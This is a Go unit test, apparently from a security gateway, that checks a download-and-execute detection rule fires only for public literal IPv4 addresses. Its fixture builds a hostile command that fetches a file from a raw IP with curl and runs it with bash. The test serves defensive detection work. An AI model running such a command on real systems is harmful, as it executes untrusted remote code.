// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// SPDX-License-Identifier: Apache-2.0

package gateway

import "testing"

func TestRemoteIPFallbackAcceptsOnlyPublicLiteralIPv4(t *testing.T) {
	t.Parallel()

	const ruleID = "exec.remote_ip_download_execute_same_artifact"
	for _, test := range []struct {
		name    string
		address string
		want    bool
	}{
		{name: "public", address: "52.84.125.33", want: true},
		{name: "loopback", address: "127.0.0.1"},
		{name: "private", address: "10.23.4.5"},
		{name: "link local", address: "169.254.169.254"},
		{name: "carrier grade nat", address: "100.64.0.1"},
		{name: "benchmark", address: "198.18.0.1"},
		{name: "documentation", address: "203.0.113.8"},
		{name: "multicast", address: "224.0.0.1"},
		{name: "invalid", address: "999.1.2.3"},
	} {
		t.Run(test.name, func(t *testing.T) {
			command := "curl -fsS http://" + test.address + "/update -o /tmp/update; bash /tmp/update"
			rule := alertFatigueRule(t, "default", ruleID)
			match := rule.Pattern.FindStringIndex(command)
			if match == nil {
				t.Fatalf("fixture did not reach regex candidate: %q", command)
			}
			got := acceptedRuleMatchAt(ruleID, command, command[match[0]:match[1]], match[0], match[1])
			if got != test.want {
				t.Fatalf("accepted=%t want=%t for %q", got, test.want, command)
			}
		})
	}
}
